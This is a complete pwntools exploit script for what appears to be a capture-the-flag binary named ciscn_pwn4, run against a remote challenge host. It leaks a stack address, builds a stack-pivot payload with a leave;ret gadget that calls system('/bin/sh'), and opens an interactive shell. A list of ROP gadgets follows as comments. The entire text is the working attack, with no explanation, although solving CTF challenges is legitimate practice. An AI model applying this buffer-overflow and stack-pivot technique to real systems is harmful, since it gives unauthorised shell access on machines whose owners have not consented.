from pwn import *
context(log_level='debug',arch='amd64',terminal=['tmux','splitw','-h'])

io=remote("node3.anna.nssctf.cn", 28350)
# io=process("./ciscn_pwn4")
elf=ELF("./ciscn_pwn4")

# gdb.attach(io)
# pause()

leave_ret=0x080484b8
io.recvuntil(b"name?\n")
payload=b"a"*0x28
io.send(payload)

io.recvuntil(b"a"*0x28)
leak_addr=u32(io.recv(4))
print("leak_addr: "+hex(leak_addr))



payload=p32(0)+p32(elf.sym[b"system"])+p32(0)+p32(leak_addr-0x28)+b"/bin/sh\x00"
payload=payload.ljust(0x28,b"a")+p32(leak_addr-0x38)+p32(leave_ret)
io.send(payload)


io.interactive()


# Gadgets information
# ============================================================
# 0x080484b8 : leave ; ret
# 0x0804869b : pop ebp ; ret
# 0x08048698 : pop ebx ; pop esi ; pop edi ; pop ebp ; ret
# 0x080483bd : pop ebx ; ret
# 0x0804869a : pop edi ; pop ebp ; ret
# 0x08048699 : pop esi ; pop edi ; pop ebp ; ret
# 0x080483a6 : ret
# 0x080484ce : ret 0xeac1

# Unique gadgets found: 8
